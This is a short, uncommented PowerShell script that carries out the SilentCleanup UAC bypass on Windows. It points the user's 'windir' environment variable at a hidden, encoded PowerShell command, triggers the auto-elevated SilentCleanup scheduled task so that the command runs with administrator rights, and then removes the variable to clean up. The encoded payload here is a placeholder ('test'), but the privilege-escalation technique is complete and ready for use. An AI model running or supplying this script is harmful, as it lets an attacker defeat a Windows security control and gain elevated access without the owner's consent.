$environmentLocation = "HKCU:\Environment"
$arbitraryName = $PSHOME + '\' + 'powershell.exe -NoP -NonI -w Hidden -enc dGVzdA=='
if ($true) {
    New-Item $environmentLocation -Force |
        New-ItemProperty -Name 'windir' -Value $arbitraryName -PropertyType string -Force | Out-Null
}
Start-Process schtasks.exe -ArgumentList '/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I'
Remove-ItemProperty -Path $environmentLocation -Name windir
